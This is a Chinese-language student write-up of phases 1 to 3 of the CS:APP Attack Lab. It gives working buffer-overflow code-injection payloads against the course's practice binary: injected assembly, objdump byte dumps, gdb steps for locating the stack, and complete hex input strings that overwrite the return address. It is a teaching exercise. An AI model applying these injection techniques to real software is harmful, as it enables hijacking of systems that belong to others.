# Attacklab

做到这个lab才发现有writeup。

## phase_1

目标是通过注入实现调用touch1函数。

先用objdump -d把汇编代码搞出来，查看getbuf和test函数开了多大的栈空间。我这里的getbuf开的是0x28，那就构造一个40个字节的输入数据先填满它，再构造一个8字节的数据覆盖test函数在栈里的位置，程序就会执行那8个字节指向位置的代码了。

这里要我们执行touch1函数，在汇编代码里查看其对应字节是00000000004017c0，注意要改成小端法表示，加到那40个字节后面即可。

随后`./hex2raw -i touch1.txt | ./ctarget -q`即完成phase_1。

## phase_2

目标是通过注入代码实现调用touch2并把参数设置成自己的cookie(我的cookie是0x59b997fa）。

注入的代码中不能含有call和jmp指令，因此要调用touch2函数，只好先将touch2函数的地址压入栈中，随后借助ret指令执行。

因此要注入的代码如下

```c
movq    $0x59b997fa, %rdi
pushq   $0x4017ec
ret
```

如何注入？首先将上述代码保存为touch2.s，通过gcc touch2.s -c 命令将其编译但不链接，生成touch2.o文件。随后通过objdump touch2.o -d 即可得到上述汇编代码对应的字节码

```shell
root@YJMSTR-Alienware17:/mnt/c/csapp/attacklab/target1# objdump -d touch2.o

touch2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq
```

我们要的是`48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3`.

随后根据上述数据构造48字节的输入数据，前40个字节包含我们的攻击代码，最后8个字节覆盖原先栈中的返回地址，使其指向我们注入的代码的起始地址。

可以在gdb中通过单步调试和layout reg获取%rsp的值，用于计算我们注入的代码的起始地址。在getbuf函数打个断点，当程序运行到这个断点时，%rsp的值为 0x5561dca0，再单步执行一步，把它减去0x28，即为我们输入的字节码存放的起始地址0x5561dc78 。由于x86-64的linux系统是小端法表示，需要将其写成78 dc 61 55 00 00 00 00.

最终我们的输入文件touch2.txt中的内容如下

```assembly
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00
```

执行命令`./hex2raw -i touch2.txt | ./ctarget -q `，即完成phase_2.

## phase_3

writeup中给出了hexmatch函数和touch3函数的c代码，其中hexmatch函数比较unsigned类型的一个参数和char* 指向的字符串的16进制表示是否相同。而touch3在调用hexmatch来比较cookie和传入的字符串参数sval。

我们的目标是通过注入代码调用touch3并将cookie作为字符串形式的参数传入。

我的cookie是0x59b997fa，按照writeup中的要求应写为8个从高位到低位排序的16进制数（不含前导0x），即对应的字节码为`35 39 62 39 39 37 66 61`。而c语言中字符串以'\0'结尾，因此在上述字节码的结尾还需要加入一个`00`，最终cookie对应的字符串参数的字节码为`35 39 62 39 39 37 66 61 00`.

注意到`When functions hexmatch and strncmp are called, they push data onto the stack, overwriting
portions of memory that held the buffer used by getbuf. ` 我们用getbuf()的栈帧就不太合适了，考虑把字符串存在更高的位置，使用test()的栈帧。将字符串作为参数传递时，寄存器中存放的是字符串的地址，此处我们使用了test栈帧中的地址。

getbuf被调用后的栈长这样

```assembly
test对应的栈帧 {
	
	返回地址{}
}
getbuf的栈帧 {
	输入的字节码（从下往上存）{}
}
```

返回地址中要存放我们输入的字节码对应的起始地址，%rdi要被设置为字符串的存放地址，由于上述原因，字符串存放在test对应栈帧中比较安全，因此我们在填充完返回地址后加上字符串对应的字节码，字符串对应的存放地址即为getbuf调用前一条指令时rsp指向的地址，在本机是0x5561dca8。

与phase_2类似，要注入的代码如下

```
movq	$0x5561dca8, %rdi
pushq	$0x4018fa
ret
```

objdump -d 得

```assembly
root@YJMSTR-Alienware17:/mnt/c/csapp/attacklab/target1# objdump touch3.o -d

touch3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
   7:   68 fa 18 40 00          pushq  $0x4018fa
   c:   c3                      retq
```

对应的字节码是`48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00` ,将其保存为touch3.txt，输入`./hex2raw -i touch3.txt | ./ctarget -q`即通过phase_3.

